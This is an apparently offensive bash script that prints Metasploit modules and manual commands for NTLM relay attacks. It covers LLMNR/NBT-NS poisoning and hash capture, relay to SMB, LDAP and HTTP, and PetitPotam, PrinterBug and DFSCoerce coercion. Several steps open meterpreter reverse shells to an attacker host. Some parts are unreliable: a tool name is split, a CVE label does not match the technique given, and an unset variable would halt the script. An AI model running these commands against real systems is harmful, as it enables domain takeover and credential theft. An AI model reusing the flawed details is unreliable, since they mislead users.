#!/usr/bin/env bash
# ==============================================================================
# NTLM RELAY — NTLM relay attacks including SMB, HTTP, LDAP
# Usage: bash ntlm_relay.sh <TARGET_IP> <ATTACKER_IP>
# ==============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../../lib/common.sh" 2>/dev/null || true
source "$SCRIPT_DIR/../../../lib/env.sh" 2>/dev/null || true
TARGET="${1:-}"; ATTACKER="${2:-}"
[[ -z "$TARGET" || -z "$ATTACKER" ]] && { echo "Usage: bash ntlm_relay.sh <TARGET_IP> <ATTACKER_IP>"; exit 1; }
IN_MSF=false; [[ "${MSF_CONSOLE:-}" == "1" ]] || [[ -n "${MSFCONSOLE_BIN:-}" ]] && IN_MSF=true
run_msf() { local m="$1"; shift; local c="use $m"; for a in "$@"; do c="$c; set $a"; done; c="$c; run"; echo "$c"; }
echo ""; echo "=== NTLM RELAY — Target: $TARGET, Attacker: $ATTACKER ==="; echo ""
echo -e "--- ${BLUE}LLMNR/NBT-NS Poisoning + Relay${NC} ---"
echo "use auxiliary/spoof/llmnr/llmnr_response; set INTERFACE eth0; run"
echo "use auxiliary/server/capture/smb; set JOHNPWFILE /tmp/ntlmv2.txt; run"
echo "use auxiliary/server/capture/http_ntlm; set SRVPORT 80; set URIPATH /; run"
echo ""
echo -e "--- ${BLUE}NTLM Relay to SMB${NC} ---"
$IN_MSF && run_msf "exploit/windows/smb/smb_relay" "RHOSTS $TARGET" "SRVHOST $ATTACKER" "PAYLOAD windows/x64/meterpreter/reverse_tcp" "LHOST $ATTACKER"
echo ""
echo -e "--- ${BLUE}NTLM Relay to LDAP (ADCS)${NC} ---"
echo "use auxiliary/server/ntlmrelay; set TARGET ldap://$TARGET; set SRVHOST $ATTACKER; set HTTPPORT 80; run"
echo ""
echo -e "--- ${BLUE}NTLM Relay to HTTP${NC} ---"
echo "use auxiliary/server/ntlmrelay; set TARGET http://$TARGET; set SRVHOST $ATTACKER; run"
echo ""
echo -e "--- ${BLUE}PetitPotam (MS-EFSRPC Coerce)${NC} ---"
$IN_MSF && run_msf "exploit/windows/local/petitpotam" "RHOSTS $TARGET" "LHOST $ATTACKER"
echo "# Or manual: coercer coerce -t $TARGET -l $ATTACKER -u user -p pass"
echo ""
echo -e "--- ${BLUE}PrinterBug / SpoolSample${NC} ---"
$IN_MSF && run_msf "exploit/windows/smb/spoolsample" "RHOSTS $TARGET" "LHOST $ATTACKER"
echo "# Manual: spoolsample.exe $TARGET $ATTACKER"
echo ""
echo -e "--- ${BLUE}DFSCoerce${NC} ---"
echo "# dfsc oerce.py $DOMAIN/user:pass@$TARGET $ATTACKER"
echo ""
echo -e "--- ${BLUE}Shadow Credentials (CVE-2021-42287/42278)${NC} ---"
echo "whisker.py add /target:machine\$ /domain:$DOMAIN /dc-ip:$TARGET /user:user /password:pass"
echo ""
echo -e "--- ${BLUE}Metasploit NTLM Relay${NC} ---"
$IN_MSF && run_msf "auxiliary/server/ntlmrelay" "TARGET smb://$TARGET" "SRVHOST $ATTACKER" "PAYLOAD windows/x64/meterpreter/reverse_tcp" "LHOST $ATTACKER"
